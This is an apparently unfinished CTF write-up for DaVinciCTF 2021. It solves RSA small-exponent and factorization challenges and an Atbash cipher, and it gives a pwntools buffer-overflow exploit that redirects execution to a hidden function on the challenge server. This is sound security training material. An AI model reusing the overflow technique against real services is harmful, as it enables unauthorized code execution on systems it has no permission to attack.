# DaVinciCTF 2021-03

<insert intro text here>

## Crypto Category

### Bootless RSA - 25

![](Challenge%20Screenshots/Bootless%20RSA.png)

Yep, one of the dangers of a small RSA exponent. If our message is significantly smaller than our modulus, we can end up with a cipher text that is simply m^e (no mod n). In this case we can simply try to find the e-th root of our cipher text to derive the original message. So I patched up a little Python script

```py
# Find the integer cube root of n
def integer_cube_root(n):
    lo = 0
    hi = n
    while lo < hi:
        mid = (lo + hi) // 2
        if mid**3 < n:
            lo = mid + 1
        else:
            hi = mid
    return lo

# RSA parameters
e = 3
n = 148818474926605063920889194160313225216327492347368329952620222220173505969004341728021623813340175402441807560635794342531823708335067243413446678485411066531733814714571491348985375389581214154895499404668547123130986872208497176485731000235899479072455273651103419116166704826517589143262273754343465721499
c = 4207289555943423943347752283361812551010483368240079114775648492647342981294466041851391508960558500182259304840957212211627194015260673748342757900843998300352612100260598133752360374373

# Get the cube of the cipher text
c_cube = integer_cube_root(c)
# Get the bit string and individual bytes
bitstr = '0' + bin(c_cube)[2:]
bits = [bitstr[i:i+8] for i in range(0,len(bitstr),8)]

# Convert byte strings to ASCII characters
flag = ''.join([chr(int(i, 2)) for i in bits])
print(flag)
```
to find the flag :)
```
dvCTF{RS4_m0dul0_inf1nity}
```



### The more, the less - 41

![](Challenge%20Screenshots/The%20more,%20the%20less.png)

Checking the factors of our modulus n in factordb we find a lot of 10-length primes, but not all are fully factorised. So let us use ... as well, to find the full factorisation of n. I added the all unknown factors to factordb :). Now that we know all primes that constitute n, we can simply derive the private key by taking the modular inverse of the RSA exponent e, mod phi(n).

```py
# Modular inverse of x mod n
def eulinv(x, n):
    a, b, u = 0, n, 1
    while x > 0:
        q = b // x # integer division
        x, a, b, u = b % x, u, x, a - q * u
    if b == 1:
        return a % n
    else:
        return None
    
# RSA parameters
n=31599415905194296507531163994468257280886159280045654346389430217405819290199334738577568528414824952061262558727052291045816515870348057534996441596560396962516719727878569643953152119895297353348080193869479088114850667155373326828408666807238584625432868509009967976378084883283066242914464294233411627
e=65537
# Cipher text
c=11371525982887248215036029303506383319725323173791816242922348267059091038845164126422411329763551336318264887183213679689757761368186436315189029720350805092964515239812759488055450797557376437081404871060787004042110689348646779529227539692241991396962852995556540999064671425810298104591755058349120054

# Initial factors of n
f = [int(i) for i in "2563604567<10> · 2715012803<10> · 2788319507<10> · 2823467653<10> · 3613621433<10> · 3876487189<10> · 3890394553<10> · 3898886171<10> · 4029819973<10> · 4226418397<10> · ".split("<10> · ")[:-1]]
# The remaining factors of n 
more_f = [int(i) for i in "2178 670709 × 2292 487361 × 2903 526499 × 3035 960167 × 3068 856233 × 3592 739747 × 3852 924077 × 3910 833851 × 4068 148789 × 4109 794417 × 2152 978987 × 2367 104263 × 2571 500203 × 2936 894063 × 2989 253341 × 3165 948211 × 3391 790461 × 3961 066927 × 3989 645813 × 4014 542803 × 4024 893437 × 4130 412409 ".replace(" ","").split("×")]
# Combine all prime factors
primes = f + more_f

# Calculate phi(n)
phi=1
for p in primes:
    phi *= (p-1)

# Calculate private key
d = eulinv(e, phi)

# Decode the message
m = pow(c, d, n)
# Get the bit string of the message
mbitstr = '0'+bin(m)[2:]
# Convert bit string to ASCII characters to form the flag
flag = ''.join([chr(int(mbitstr[i:i+8], 2)) for i in range(0,len(mbitstr),8)])
print(flag)
```

```
dvCTF{rs4_f4ctor1z4t10n!!!}
```



### Substitution - 25

![](Challenge%20Screenshots/Substitution.png)

```
Rm xibkgltizksb, z hfyhgrgfgrlm xrksvi rh z nvgslw lu vmxibkgrmt rm dsrxs fmrgh lu kozrmgvcg ziv ivkozxvw drgs xrksvigvcg, zxxliwrmt gl z urcvw hbhgvn; gsv "fmrgh" nzb yv hrmtov ovggvih (gsv nlhg xlnnlm), kzrih lu ovggvih, girkovgh lu ovggvih, nrcgfivh lu gsv zylev, zmw hl uligs. Gsv ivxvrevi wvxrksvih gsv gvcg yb kviulinrmt gsv rmevihv hfyhgrgfgrlm.

Hfyhgrgfgrlm xrksvih xzm yv xlnkzivw drgs gizmhklhrgrlm xrksvih. Rm z gizmhklhrgrlm xrksvi, gsv fmrgh lu gsv kozrmgvcg ziv ivziizmtvw rm z wruuvivmg zmw fhfzoob jfrgv xlnkovc liwvi, yfg gsv fmrgh gsvnhvoevh ziv ovug fmxszmtvw. Yb xlmgizhg, rm z hfyhgrgfgrlm xrksvi, gsv fmrgh lu gsv kozrmgvcg ziv ivgzrmvw rm gsv hznv hvjfvmxv rm gsv xrksvigvcg, yfg gsv fmrgh gsvnhvoevh ziv zogvivw.

Gsviv ziv z mfnyvi lu wruuvivmg gbkvh lu hfyhgrgfgrlm xrksvi. Ru gsv xrksvi lkvizgvh lm hrmtov ovggvih, rg rh gvinvw z hrnkov hfyhgrgfgrlm xrksvi; z xrksvi gszg lkvizgvh lm ozitvi tilfkh lu ovggvih rh gvinvw klobtizksrx. Z nlmlzokszyvgrx xrksvi fhvh urcvw hfyhgrgfgrlm levi gsv vmgriv nvhhztv, dsvivzh z klobzokszyvgrx xrksvi fhvh z mfnyvi lu hfyhgrgfgrlmh zg wruuvivmg klhrgrlmh rm gsv nvhhztv, dsviv z fmrg uiln gsv kozrmgvcg rh nzkkvw gl lmv lu hvevizo klhhryrorgrvh rm gsv xrksvigvcg zmw erxv evihz.
weXGU{xi1kg3w_x1ks3i}
```

Using any cipher identifier will tell us it is encoded using the Atbash Cipher. Decoding it gives us a nice educational paragraph on substitution ciphers. 

```
In cryptography, a substitution cipher is a method of encrypting in which units of plaintext are replaced with ciphertext, according to a fixed system; the "units" may be single letters (the most common), pairs of letters, triplets of letters, mixtures of the above, and so forth. The receiver deciphers the text by performing the inverse substitution.

Substitution ciphers can be compared with transposition ciphers. In a transposition cipher, the units of the plaintext are rearranged in a different and usually quite complex order, but the units themselves are left unchanged. By contrast, in a substitution cipher, the units of the plaintext are retained in the same sequence in the ciphertext, but the units themselves are altered.

There are a number of different types of substitution cipher. If the cipher operates on single letters, it is termed a simple substitution cipher; a cipher that operates on larger groups of letters is termed polygraphic. A monoalphabetic cipher uses fixed substitution over the entire message, whereas a polyalphabetic cipher uses a number of substitutions at different positions in the message, where a unit from the plaintext is mapped to one of several possibilities in the ciphertext and vice versa.
```

Oh, and also the flag :).

```
dvCTF{cr1pt3d_c1ph3r}
```



## Pwn Category

### Kanagawa - 59

![](Challenge%20Screenshots/Kanagawa.png)

...

```py
# Imports
from pwn import *

# Host and port
host = "challs.dvc.tf"
port = 4444

# Buffer sizes of user inputs
buf1 = b'A'*40
buf2 = b'A'*1024

# Payload (hex address of recovery_mode())
payload = b'\x1b\x85\x04\x08'

# Set up connection
s = remote(host, port)

# Send payload
s.recvuntil(": ")
s.sendline(buf1+payload)
# Get through the binary inputs
s.recvuntil(": ")
s.sendline(buf2)

# Print received lines (flag?)
print(s.recv())

# Close connection
s.close()
```

```
dvCTF{0v3rfl0w_tsun4m1}
```



### Format me - 90

![](Challenge%20Screenshots/Format%20me.png)

...

```py

```

```

```